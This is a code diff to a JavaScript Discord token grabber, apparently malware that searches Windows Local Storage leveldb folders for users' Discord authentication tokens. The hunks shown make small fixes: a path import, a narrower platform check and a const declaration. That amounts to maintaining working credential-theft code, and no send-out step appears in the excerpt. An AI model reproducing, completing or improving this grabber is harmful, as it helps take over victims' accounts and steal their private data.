@@ -1,4 +1,5 @@
 const fs = require('fs');
+const path = require('path');
 
 function findToken(tokenPath) {
     tokenPath += "\\Local Storage\\leveldb";
@@ -37,7 +38,7 @@ function discordTokenGrabber () {
     let paths;
     const computerPlatform = process.platform
 
-    if (computerPlatform == "win32" || computerPlatform == "win64") {
+    if (computerPlatform == "win32") {
         const local = process.env.LOCALAPPDATA
         const roaming = process.env.APPDATA
         
@@ -64,7 +65,7 @@ function discordTokenGrabber () {
     
     const tokens = {};
     for (let [platform, path] of Object.entries(paths)) {
-        tokenList = findToken(path);
+        const tokenList = findToken(path);
         if (tokenList) {
             tokenList.forEach(token => {
                 if (tokens[platform] === undefined) tokens[platform] = []
